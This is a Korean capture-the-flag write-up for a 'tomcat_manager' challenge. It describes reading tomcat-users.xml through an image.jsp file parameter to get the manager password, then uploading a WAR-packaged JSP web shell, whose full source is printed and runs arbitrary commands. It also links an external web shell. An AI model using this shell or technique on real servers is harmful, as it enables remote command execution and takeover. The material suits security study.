## tomcat_manager
---

문제 파일에서 ROOT.war 파일이 있다. 

war 파일은 확장자를 zip으로 바꾸면 zip 파일이 되고 그 반대의 경우도 마찬가지다.

zip 파일로 바꾸면 index.jsp, image.jsp 등이 보인다.


## Solution
---

우선 image.jsp 파일에서 file로 읽을 파일을 입력받는다.

기본 값은 resources/working.png 이다.

이 부분을 이용해서 우선 tomcat-users.xml 파일을 읽어서 tomcat의 비밀번호를 흭득했다. 

처음엔 directory traversal 문제인줄 알고 플래그를 읽으려고 했으나 플래그는 실행 파일이여서 읽을 수가 없다!

<br>

tomcat 사용자의 비밀번호를 구한 다음 이 비밀번호를 통해 tomcat에 접속해야 한다. 

유저 이름은 tomcat-users.xml을 보면 된다. tomcat이다.

이 부분을 몰라서 헤맸다. 검색하면 /manager 페이지에 접속해야 한다.

<br>

웹셸을 올려야 될 것 같아서 찾아보았다.

파일 업로드 취약점 : <a href="https://m.blog.naver.com/sjhmc9695/221996754470" target="_blank">m.blog.naver.com/sjhmc9695/221996754470</a>

위 페이지에 있는 웹셸로는 안되서 따로 찾아서 풀었다.

<br>

webshell : <a href="https://github.com/BustedSec/webshell/blob/master/webshell.war" target="_blank">github.com/BustedSec/webshell/blob/master/webshell.war</a>

<br>

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

<br>

이 웹셸을 압축하여 war 파일로 확장자를 변경한 후 업로드 한 뒤 명령어를 입력하면 된다.
